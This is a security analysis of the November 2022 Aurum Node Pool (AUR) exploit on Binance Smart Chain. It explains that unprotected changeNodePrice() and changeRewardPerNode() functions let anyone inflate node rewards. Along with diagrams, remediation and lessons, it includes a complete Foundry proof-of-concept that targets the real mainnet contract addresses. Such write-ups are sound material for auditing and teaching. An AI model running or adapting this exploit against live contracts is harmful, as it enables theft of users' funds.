# AUR — Missing Access Control on changeNodePrice()/changeRewardPerNode() Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | Aurum Node Pool (AUR) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **AurumNodePool** | [0x70678291bDDfd95498d1214BE368e19e882f7614](https://bscscan.com/address/0x70678291bDDfd95498d1214BE368e19e882f7614) |
| **AUR Token** | [0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78](https://bscscan.com/address/0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | `changeNodePrice()` and `changeRewardPerNode()` lack access control, allowing anyone to manipulate node price and reward rate |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/AUR_exp.sol) |

---
## 1. Vulnerability Overview

The `AurumNodePool` contract of Aurum Node Pool provided `changeNodePrice()` and `changeRewardPerNode()` functions that allowed administrators to configure the node creation cost (`nodePrice`) and daily reward rate per node (`rewardPerNode`). However, neither function had `onlyOwner` or equivalent access control. The attacker swapped a small amount of BNB for AUR to create a node at minimal cost, then used `changeRewardPerNode()` to set the reward rate to an extreme value of `434e27`, and by advancing the block timestamp, claimed accumulated rewards via `claimNodeReward()`.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable AurumNodePool - no access control on parameter modification functions
contract AurumNodePool {
    uint256 public nodePrice;       // 노드 생성 비용
    uint256 public rewardPerNode;   // 노드당 일일 보상

    // ❌ Anyone can change node price
    function changeNodePrice(uint256 newPrice) external {
        nodePrice = newPrice;
    }

    // ❌ Anyone can change reward rate
    function changeRewardPerNode(uint256 newReward) external {
        rewardPerNode = newReward;
    }

    function createNode() external {
        AUR.transferFrom(msg.sender, address(this), nodePrice);
        nodes[msg.sender].push(Node({
            createdAt: block.timestamp,
            lastClaim: block.timestamp
        }));
    }

    function claimNodeReward() external {
        uint256 totalReward = 0;
        for (uint i = 0; i < nodes[msg.sender].length; i++) {
            uint256 elapsed = block.timestamp - nodes[msg.sender][i].lastClaim;
            // Manipulated rewardPerNode × elapsed time
            totalReward += elapsed * rewardPerNode / 1 days;
            nodes[msg.sender][i].lastClaim = block.timestamp;
        }
        AUR.transfer(msg.sender, totalReward);
    }
}

// ✅ Correct pattern - onlyOwner applied
contract SafeAurumNodePool is Ownable {
    uint256 public nodePrice;
    uint256 public rewardPerNode;

    function changeNodePrice(uint256 newPrice) external onlyOwner {
        require(newPrice > 0, "Invalid price");
        nodePrice = newPrice;
    }

    function changeRewardPerNode(uint256 newReward) external onlyOwner {
        // ✅ Maximum reward rate cap set
        require(newReward <= MAX_REWARD_PER_NODE, "Exceeds max reward");
        rewardPerNode = newReward;
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**AUR_decompiled.sol** — Entry points:
```solidity
// ❌ Root cause: `changeNodePrice()` and `changeRewardPerNode()` lack access control, allowing anyone to manipulate node price and reward rate
    function changeNodePrice(uint256 arg0) external view returns (uint256) {}  // 0x8013858b  // ❌ Vulnerability

    function changeRewardPerNode(uint256 arg0) external {}  // 0x7b770392  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 0.01 BNB → AUR swap (PancakeSwap)
    │
    ├─[2] Call changeNodePrice(1e21)
    │       ❌ No access control
    │       → Minimize node creation cost
    │
    ├─[3] Call createNode()
    │       Create node at minimal cost (1e21 AUR)
    │
    ├─[4] Call changeRewardPerNode(434e27)
    │       ❌ No access control
    │       → Set reward rate hundreds of millions of times higher than normal
    │
    ├─[5] vm.warp() or wait (simulate time elapsed)
    │       Rewards accumulate
    │
    ├─[6] Call claimNodeReward()
    │       Manipulated rewardPerNode × elapsed time = massive AUR
    │
    ├─[7] AUR → BNB reverse swap
    │
    └─[8] Net profit: BNB (scale unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IAurumNodePool {
    // ❌ Parameter modification functions with no access control
    function changeNodePrice(uint256 newPrice) external;
    function changeRewardPerNode(uint256 newReward) external;
    function createNode() external;
    function claimNodeReward() external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IRouter {
    function swapExactETHForTokens(
        uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external payable returns (uint256[] memory);
    function swapExactTokensForETH(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external returns (uint256[] memory);
}

contract AURExploit is Test {
    IAurumNodePool pool = IAurumNodePool(0x70678291bDDfd95498d1214BE368e19e882f7614);
    IERC20 AUR           = IERC20(0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78);
    IRouter router       = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address WBNB         = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] BNB", address(this).balance, 18);

        // [Step 1] Swap small amount of BNB → AUR
        address[] memory path = new address[](2);
        path[0] = WBNB; path[1] = address(AUR);
        router.swapExactETHForTokens{value: 0.01 ether}(0, path, address(this), block.timestamp);

        // [Step 2] Minimize node price (no access control)
        pool.changeNodePrice(1e21);

        // [Step 3] Create node at minimal cost
        AUR.approve(address(pool), type(uint256).max);
        pool.createNode();

        // [Step 4] Maximize reward rate (no access control)
        // ⚡ Set to hundreds of millions of times normal reward
        pool.changeRewardPerNode(434e27);

        // [Step 5] Advance time (accumulate rewards)
        vm.warp(block.timestamp + 1 days);

        // [Step 6] Claim massive AUR rewards
        pool.claimNodeReward();

        emit log_named_decimal_uint("[After Mint] AUR", AUR.balanceOf(address(this)), 18);

        // [Step 7] Reverse swap AUR → BNB
        path[0] = address(AUR); path[1] = WBNB;
        AUR.approve(address(router), type(uint256).max);
        router.swapExactTokensForETH(AUR.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        emit log_named_decimal_uint("[End] BNB", address(this).balance, 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing access control on admin parameter modification functions |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | `changeNodePrice(min value)` → `createNode()` → `changeRewardPerNode(max value)` → `claimNodeReward()` |
| **Preconditions** | No access control on `changeNodePrice()` and `changeRewardPerNode()` functions |
| **Impact** | Mass theft of AUR tokens (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **onlyOwner modifier**: Add `onlyOwner` or `onlyAdmin` modifier to `changeNodePrice()` and `changeRewardPerNode()`.
2. **Parameter caps**: Set a maximum cap (`MAX_REWARD_PER_NODE`) on the reward rate to limit damage even if the owner key is compromised.
3. **Timelock**: Apply a timelock to sensitive parameter changes to allow time for community monitoring before changes take effect.

---
## 7. Lessons Learned

- **Protecting parameters in node protocols**: In node-based DeFi protocols, economic parameters such as `nodePrice` and `rewardPerNode` are the most sensitive assets to protect. Without access control on these functions, the entire token economy of the protocol can collapse in a single transaction.
- **Separation of configuration and execution functions**: `change*()` family functions must be restricted to administrators, and should have a different level of access control from general user-facing functions (`createNode()`, `claim()`).
- **Reward rate caps**: Defensive design that sets an absolute cap on the reward rate is critical to prevent unbounded token inflation even if owner privileges are compromised or a bug occurs.